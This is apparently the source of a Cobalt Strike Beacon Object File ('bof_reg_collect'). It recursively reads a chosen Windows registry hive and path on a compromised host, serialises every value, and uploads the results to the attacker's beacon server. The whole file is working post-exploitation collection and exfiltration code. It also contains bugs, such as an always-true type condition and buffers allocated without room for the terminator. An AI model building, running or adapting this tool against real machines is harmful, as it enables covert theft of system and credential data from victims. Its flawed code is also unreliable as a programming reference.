#include "beacon.h"
#include "bofdefs.h"
#include "queue.c"
#include "upload_file.c"
#include <stdbool.h>
#include <windows.h>

#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

typedef struct _RegPath {
  unsigned int type;

  unsigned int path_length;
  wchar_t *path;

  unsigned int key_length;
  wchar_t *key;

  unsigned int value_length;
  wchar_t *value;
} RegPath;

wchar_t *path_join(const wchar_t *path1, const wchar_t *path2) {
  wchar_t *new_path;
  if (MSVCRT$wcscmp(path1, L"") == 0) {
    int path_length = MSVCRT$wcslen(path2);
    new_path = intAlloc(path_length * sizeof(wchar_t));
    MSVCRT$wcscpy(new_path, path2);
    return new_path;
  }
  if (MSVCRT$wcscmp(path2, L"") == 0) {
    int path_length = MSVCRT$wcslen(path1);
    new_path = intAlloc(path_length * sizeof(wchar_t));
    MSVCRT$wcscpy(new_path, path1);
    return new_path;
  }
  int path1len = MSVCRT$wcslen(path1);
  int path2len = MSVCRT$wcslen(path2);
  int totallen = path1len + path2len + 2;
  new_path = intAlloc(totallen * sizeof(wchar_t));
  if (!new_path) {
    BeaconPrintf(CALLBACK_ERROR, "Could not allocate memory for joined path");
    return NULL;
  }
  MSVCRT$wcscpy(new_path, path1);
  MSVCRT$wcscat(new_path, L"\\");
  MSVCRT$wcscat(new_path, path2);
  return new_path;
}

void query_registry_path(Pqueue queue, HKEY hive, const wchar_t *arg_hive,
                       const wchar_t *key_path, bool recurse) {
  HKEY target_reg_key;
  DWORD rc1, rc2, rc3, rc4;

  if ((rc1 = ADVAPI32$RegOpenKeyExW(hive, key_path, 0,
                                    KEY_READ | KEY_ENUMERATE_SUB_KEYS |
                                        KEY_QUERY_VALUE,
                                    &target_reg_key)) == ERROR_SUCCESS) {
    WCHAR ach_class[MAX_PATH];      // buffer for class name
    DWORD cch_class_name = MAX_PATH; // size of class string
    DWORD num_subkeys = 0;         // number of subkeys
    DWORD max_subkey_length;       // longest subkey size
    DWORD max_class;             // longest class string
    DWORD num_values;              // number of values for key
    DWORD max_key_length;          // longest value name
    DWORD max_value_length;        // longest value data
    DWORD security_descriptor_length;    // size of security descriptor
    DWORD i;

    if ((rc2 = ADVAPI32$RegQueryInfoKeyW(
             target_reg_key, ach_class, &cch_class_name, NULL, &num_subkeys,
             &max_subkey_length, &max_class, &num_values, &max_key_length,
             &max_value_length, &security_descriptor_length, NULL)) ==
        ERROR_SUCCESS) {

      // Enumerate Subkeys and recurse
      if (num_subkeys) {
        for (i = 0; i < num_subkeys; i++) {
          DWORD subkey_name_size = MAX_KEY_LENGTH;
          WCHAR subkey_name[MAX_KEY_LENGTH]; // buffer for subkey name
          if ((rc3 = ADVAPI32$RegEnumKeyExW(target_reg_key, i, subkey_name,
                                            &subkey_name_size, NULL, NULL, NULL,
                                            NULL)) == ERROR_SUCCESS) {

            if (recurse) {
              wchar_t *new_key = path_join(key_path, subkey_name);
              query_registry_path(queue, hive, arg_hive, new_key, recurse);
              intFree(new_key);
            }
          } else {
            BeaconPrintf(CALLBACK_ERROR, "RegEnumKeyEx error: %d\n", rc3);
          }
        }
      }

      // Enumerate Keys.
      if (num_values) {
        for (i = 0, rc4 = ERROR_SUCCESS; i < num_values; i++) {
          LPWSTR key = (LPWSTR)intAlloc(++max_key_length * sizeof(WCHAR));
          DWORD key_length = max_key_length;
          DWORD value_type;
          LPBYTE value_data = (LPBYTE)intAlloc(max_value_length);
          DWORD value_data_length = max_value_length;

          if ((rc4 = ADVAPI32$RegEnumValueW(
                   target_reg_key, i, key, &key_length, NULL, &value_type,
                   value_data, &value_data_length)) == ERROR_SUCCESS) {
            RegPath *reg_path = (RegPath *)intAlloc(sizeof(RegPath));
            queue->push(queue, reg_path);
            reg_path->type = value_type;

            wchar_t *total_path = path_join(arg_hive, key_path);
            size_t total_path_length = MSVCRT$wcslen(total_path);
            reg_path->path_length = total_path_length * sizeof(wchar_t);
            reg_path->path =
                (wchar_t *)intAlloc(total_path_length * sizeof(wchar_t));
            MSVCRT$memcpy(reg_path->path, total_path,
                          total_path_length * sizeof(wchar_t));
            intFree(total_path);

            reg_path->key_length = key_length * sizeof(wchar_t);
            reg_path->key = (wchar_t *)intAlloc(key_length * sizeof(wchar_t));
            MSVCRT$memcpy(reg_path->key, key, key_length * sizeof(wchar_t));

            if (value_type == REG_NONE) {
              reg_path->value_length = 0;
              reg_path->value = NULL;
            } else if (value_type == REG_SZ) {
              reg_path->value_length = value_data_length;
              reg_path->value = (wchar_t *)intAlloc(value_data_length);
              MSVCRT$memcpy(reg_path->value, value_data, value_data_length);
            } else if (value_type == REG_EXPAND_SZ) {
              reg_path->value_length = value_data_length;
              reg_path->value = (wchar_t *)intAlloc(value_data_length);
              MSVCRT$memcpy(reg_path->value, value_data, value_data_length);
            } else if (value_type == REG_DWORD ||
                       value_type == REG_DWORD_BIG_ENDIAN) {
              reg_path->value_length = sizeof(DWORD);
              reg_path->value = (wchar_t *)intAlloc(sizeof(DWORD));
              DWORD value = *(DWORD *)value_data;
              MSVCRT$memcpy(reg_path->value, &value, sizeof(DWORD));
            } else if (value_type == REG_BINARY || REG_LINK ||
                       value_type == REG_MULTI_SZ ||
                       value_type == REG_RESOURCE_LIST ||
                       value_type == REG_FULL_RESOURCE_DESCRIPTOR ||
                       value_type == REG_RESOURCE_REQUIREMENTS_LIST) {
              reg_path->value_length = value_data_length;
              reg_path->value = (wchar_t *)intAlloc(value_data_length);
              MSVCRT$memcpy(reg_path->value, value_data, value_data_length);
            } else if (value_type == REG_QWORD) {
              reg_path->value_length = sizeof(QWORD);
              reg_path->value = (wchar_t *)intAlloc(sizeof(QWORD));
              QWORD value = *(QWORD *)value_data;
              MSVCRT$memcpy(reg_path->value, &value, sizeof(QWORD));
            } else {
              BeaconPrintf(CALLBACK_ERROR, "Unsupported type: %d\n",
                           value_type);
              reg_path->value_length = value_data_length;
              reg_path->value = (wchar_t *)intAlloc(value_data_length);
              MSVCRT$memcpy(reg_path->value, value_data, value_data_length);
            }
          } else {
            BeaconPrintf(CALLBACK_ERROR, "[WARNING] Error code: %li\n", rc4);
          }
          intFree(key);
          intFree(value_data);
        }
      }
    } else {
      // BeaconPrintf(CALLBACK_ERROR, "RegQueryInfoKeyW returned error: %d\n",
      // rc2);
    }
  } else {
    // BeaconPrintf(CALLBACK_ERROR, "RegOpenKeyExW returned error: %d\n", rc1);
  }
  ADVAPI32$RegCloseKey(target_reg_key);
}

void format_upload_registry_data(Pqueue queue, char *upload_file_name) {
  Pitem cursor;
  RegPath *curitem;
  formatp obj;
  int i = 1;
  unsigned int size = 0;
  char *out;
  int fmt_size;

  cursor = queue->head;

  // Calculate size of the buffer
  size += sizeof(unsigned int);
  while (cursor != queue->tail) {
    RegPath *reg_cursor = (RegPath *)cursor->elem;
    i++;
    size += sizeof(RegPath) + reg_cursor->key_length + reg_cursor->path_length +
            reg_cursor->value_length;
    cursor = cursor->next;
  }

  BeaconFormatAlloc(&obj, size);
  BeaconFormatInt(&obj, i);

  while ((curitem = queue->pop(queue)) != NULL) {
    BeaconFormatInt(&obj, curitem->type);
    BeaconFormatInt(&obj, curitem->path_length);
    BeaconFormatAppend(&obj, (char *)curitem->path, curitem->path_length);
    BeaconFormatInt(&obj, curitem->key_length);
    BeaconFormatAppend(&obj, (char *)curitem->key, curitem->key_length);
    BeaconFormatInt(&obj, curitem->value_length);
    if (curitem->type == REG_DWORD || curitem->type == REG_DWORD_BIG_ENDIAN) {
      BeaconFormatAppend(&obj, (char *)curitem->value, sizeof(DWORD));
    } else if (curitem->type == REG_QWORD) {
      BeaconFormatAppend(&obj, (char *)curitem->value, sizeof(QWORD));
    } else {
      BeaconFormatAppend(&obj, (char *)curitem->value, curitem->value_length);
    }

    // clean up
    intFree(curitem->value);
    intFree(curitem->key);
    intFree(curitem->path);
    intFree(curitem);
  }
  queue->free(queue);

  out = BeaconFormatToString(&obj, &fmt_size);
  upload_file(upload_file_name, out, fmt_size);
  BeaconFormatFree(&obj);
}

void go(char *args, int alen) {
  Pqueue queue;
  HKEY target_hive;
  char *arg_file_name;
  char *arg_hive;
  char *arg_path;
  wchar_t *path;
  datap parser;
  int num_keys;

  BeaconDataParse(&parser, args, alen);
  arg_file_name = BeaconDataExtract(&parser, NULL);
  arg_hive = BeaconDataExtract(&parser, NULL);
  arg_path = BeaconDataExtract(&parser, NULL);

  if (arg_file_name == NULL || arg_hive == NULL || arg_path == NULL) {
    BeaconPrintf(CALLBACK_ERROR,
                 "Usage: bof_reg_collect <file_name> <hive> <path>\n");
    return;
  }

  if (MSVCRT$strcmp(arg_hive, "HKCR") == 0) {
    target_hive = HKEY_CLASSES_ROOT;
  } else if (MSVCRT$strcmp(arg_hive, "HKCU") == 0) {
    target_hive = HKEY_CURRENT_USER;
  } else if (MSVCRT$strcmp(arg_hive, "HKLM") == 0) {
    target_hive = HKEY_LOCAL_MACHINE;
  } else if (MSVCRT$strcmp(arg_hive, "HKU") == 0) {
    target_hive = HKEY_USERS;
  } else if (MSVCRT$strcmp(arg_hive, "HKCC") == 0) {
    target_hive = HKEY_CURRENT_CONFIG;
  } else {
    BeaconPrintf(CALLBACK_ERROR, "Unknown hive: %s", arg_hive);
    return;
  }

  wchar_t arg_hive_w[100];
  toWideChar(arg_hive, arg_hive_w, 100);

  queue = queueInit();

  int wchars_num =
      KERNEL32$MultiByteToWideChar(CP_UTF8, 0, arg_path, -1, NULL, 0);
  path = (wchar_t *)intAlloc(wchars_num * sizeof(wchar_t));
  KERNEL32$MultiByteToWideChar(CP_UTF8, 0, arg_path, -1, path, wchars_num);

  query_registry_path(queue, target_hive, arg_hive_w, path, true);

  num_keys = queue->size(queue);
  BeaconPrintf(CALLBACK_OUTPUT, "Total reg keys: %d", num_keys);
  if (num_keys != 0)
    format_upload_registry_data(queue, arg_file_name);
  intFree(path);
}
